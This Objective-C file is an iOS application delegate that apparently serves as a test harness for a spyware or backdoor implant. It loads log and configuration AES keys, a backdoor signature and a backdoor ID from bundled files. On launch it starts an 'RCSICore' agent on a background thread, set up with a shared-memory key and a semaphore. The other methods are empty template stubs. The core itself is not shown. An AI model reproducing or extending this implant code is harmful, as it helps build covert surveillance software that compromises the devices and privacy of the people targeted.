//
//  ios_test_appAppDelegate.m
//  ios-test-app
//
//  Created by kiodo on 24/03/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "ios_test_appAppDelegate.h"

#define LOG_KEY_FILE  @"logAesKey.txt"
#define CFG_KEY_FILE  @"cfgAesKey.txt"
#define SIGN_FILE     @"signature.txt"
#define BCKDR_FILE    @"backdoorId.txt"

void asciiToHex(char *string, char *binary)
{
  char digit[3];
  
  for (int i=0, j=0; i<32; i+=2,j++) 
  {
    digit[0] = string[i]; digit[1] = string[i+1]; digit[2] = 0;
    sscanf(digit, "%x", ((char*)binary)+j);
  }
}

@implementation ios_test_appAppDelegate

@synthesize window = _window;

- (void)setGlobalVars
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString *path = [[NSBundle mainBundle] bundlePath];
  
  NSString *logAesKeyFilename     = [NSString stringWithFormat: @"%@/%@", path, @"logAesKey.txt"];
  NSString *cfgAesKeyFilename     = [NSString stringWithFormat: @"%@/%@", path, @"cfgAesKey.txt"];
  NSString *signatureFilename     = [NSString stringWithFormat: @"%@/%@", path, @"signature.txt"];
  NSString *backdoorIDFilename    = [NSString stringWithFormat: @"%@/%@", path, @"backdoorId.txt"];
  
  NSData  *logKeyData = [NSData dataWithContentsOfFile: logAesKeyFilename];
  NSData  *cfgKeyData = [NSData dataWithContentsOfFile: cfgAesKeyFilename];
  NSData  *signData   = [NSData dataWithContentsOfFile: signatureFilename];
  NSData  *bckdrData  = [NSData dataWithContentsOfFile: backdoorIDFilename];
  
  asciiToHex((char*)[logKeyData bytes], gLogAesKey);
  asciiToHex((char*)[cfgKeyData bytes], gConfAesKey);
  asciiToHex((char*)[signData bytes], gBackdoorSignature);
  memcpy(gBackdoorID, [bckdrData bytes], 16);
  gBackdoorID[14] = 0; gBackdoorID[15] = 0;
  
  [pool release];
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
  //configurationFileName: "b2YC6yY6CFcc";
  
  int shMemKey  = 31337;
  int shMemSize = SHMEM_COMMAND_MAX_SIZE;
  NSString *semaphoreName = @"SUX";
  
  [self setGlobalVars];
  
  RCSICore *core = [[RCSICore alloc] initWithKey: shMemKey
                                sharedMemorySize: shMemSize
                                   semaphoreName: semaphoreName];
                                  
  [NSThread detachNewThreadSelector:@selector(runMeh) toTarget:core withObject:nil];
  
  [gDylibName retain];
  [gConfigurationName retain];
  [gConfigurationUpdateName retain];
                                                                
  [self.window makeKeyAndVisible];
  return YES;
}

- (void)applicationWillResignActive:(UIApplication *)application
{
  /*
   Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
   Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.
   */
}

- (void)applicationDidEnterBackground:(UIApplication *)application
{
  /*
   Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later. 
   If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
   */
}

- (void)applicationWillEnterForeground:(UIApplication *)application
{
  /*
   Called as part of the transition from the background to the inactive state; here you can undo many of the changes made on entering the background.
   */
}

- (void)applicationDidBecomeActive:(UIApplication *)application
{
  /*
   Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
   */
}

- (void)applicationWillTerminate:(UIApplication *)application
{
  /*
   Called when the application is about to terminate.
   Save data if appropriate.
   See also applicationDidEnterBackground:.
   */
}

- (void)dealloc
{
  [_window release];
    [super dealloc];
}

@end
